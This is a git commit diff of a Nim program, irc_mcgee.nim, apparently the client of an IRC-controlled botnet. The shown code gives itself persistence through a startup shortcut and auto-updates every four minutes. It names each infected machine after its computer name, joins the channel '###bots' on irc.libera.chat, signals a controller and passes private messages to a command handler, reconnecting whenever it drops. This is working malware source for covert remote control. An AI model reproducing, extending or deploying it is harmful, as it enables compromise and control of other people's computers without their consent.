77a9759a258ac4438a57b132159e5753dd2bde20
Jackson Smackson <crackman2@users.noreply.github.com>
2023-10-08 22:17:48 +0200

    1.0.9.9a

--- irc_mcgee.nim
+++ irc_mcgee.nim
@@ -3,82 +3,85 @@ import irc, asyncdispatch, winim, random, strutils, threadpool
 import command_handler, update_handler
 
 
-
-# Check for updates
-waitFor updt_clearTemp()
-#discard updt_check(false, nil, IrcEvent())
-echo "Running here"
-
-
-
-proc updatePoller() {.async.} =
-  while true:
-    discard updt_check(false, nil, IrcEvent())
-    await sleepAsync(240000) # wait 4 minutes
-
-if g_first_run:
-  g_first_run = false
-  discard updatePoller()
-
-updt_createStartupShortcut()
-
-var
-    name_buffer: array[0..15, WCHAR]
-    name_size : DWORD
-    name : string
-name_size = 15*sizeof(WCHAR)
-
-## Nickname is based on computer name
-if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
-    raise newException(OSError, "Failed to retrieve computer name")
-
-## The computer name needs to become a proper string as opposed to a raw buffer
-for i in 0..<len(name_buffer):
-    if name_buffer[i] != 0:
-        name &= cast[char](name_buffer[i])
-    else:
-        break
-
-if g_dbg: echo "ComputerName: ", name
-
-## The final nickname must be 16 chars long so the rest will be filled with random digits
-randomize()
-var 
-  randInt1 = rand(1000000..9999999)
-  randInt2 = rand(1000000..9999999)
-  target_channel:string = "###bots"
+while true:
+  # Check for updates
+  waitFor updt_clearTemp()
+  #discard updt_check(false, nil, IrcEvent())
+  echo "Running here"
 
 
-if g_dbg: echo "Trying to connect"
 
-if g_dbg: echo "Connected"
+  proc updatePoller() {.async.} =
+    while true:
+      discard updt_check(false, nil, IrcEvent())
+      await sleepAsync(240000) # wait 4 minutes
 
-proc onIrcEvent(client: AsyncIrc, event: IrcEvent) {.async.} =
+  if g_first_run:
+    g_first_run = false
+    discard updatePoller()
+
+  updt_createStartupShortcut()
+
+  var
+      name_buffer: array[0..15, WCHAR]
+      name_size : DWORD
+      name : string
+  name_size = 15*sizeof(WCHAR)
+
+  ## Nickname is based on computer name
+  if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
+      raise newException(OSError, "Failed to retrieve computer name")
+
+  ## The computer name needs to become a proper string as opposed to a raw buffer
+  for i in 0..<len(name_buffer):
+      if name_buffer[i] != 0:
+          name &= cast[char](name_buffer[i])
+      else:
+          break
+
+  if g_dbg: echo "ComputerName: ", name
+
+  ## The final nickname must be 16 chars long so the rest will be filled with random digits
+  randomize()
+  var 
+    randInt1 = rand(1000000..9999999)
+    randInt2 = rand(1000000..9999999)
+    target_channel:string = "###bots"
+
+
+  if g_dbg: echo "Trying to connect"
+
+  if g_dbg: echo "Connected"
+
+  proc onIrcEvent(client: AsyncIrc, event: IrcEvent) {.async.} =
+    try:
+      case event.typ
+      of EvConnected:
+        discard
+      of EvDisconnected, EvTimeout:
+        #break
+        await client.reconnect()
+      of EvMsg:
+        if event.cmd == MPrivMsg:
+          if event.origin != target_channel:
+            spawn cmdh_handle(event, client)
+        if event.raw.contains(":End of /NAMES list."):
+          ## Notify the controller that the bot has joined
+          discard client.privmsg(target_channel,".")
+        
+        if g_dbg: echo(event.raw)
+    except OSError as e:
+      echo "onIrcEvent exception: [", repr(e), "]"
+
+  var  client = newAsyncIrc("irc.libera.chat", nick=name & $randInt1 & $randInt2, joinChans = @[target_channel], realname = "Zanza", user="Zanza", callback = onIrcEvent)
+
   try:
-    case event.typ
-    of EvConnected:
-      discard
-    of EvDisconnected, EvTimeout:
-      #break
-      await client.reconnect()
-    of EvMsg:
-      if event.cmd == MPrivMsg:
-        if event.origin != target_channel:
-          spawn cmdh_handle(event, client)
-      if event.raw.contains(":End of /NAMES list."):
-        ## Notify the controller that the bot has joined
-        discard client.privmsg(target_channel,".")
-      
-      if g_dbg: echo(event.raw)
-  except OSError as e:
-    echo "onIrcEvent exception: [", repr(e), "]"
+    asyncCheck client.run()
+  except:
+    echo "FUCKING HELL"
+    Sleep(10000)
 
-var  client = newAsyncIrc("irc.libera.chat", nick=name & $randInt1 & $randInt2, joinChans = @[target_channel], realname = "Zanza", user="Zanza", callback = onIrcEvent)
-
-try:
-  asyncCheck client.run()
-except:
-  echo "FUCKING HELL"
-  Sleep(10000)
-
-runForever()
+  try:
+    runForever()
+  except:
+    echo "EVERYTHING IS FUCKED UP. RETRYING"
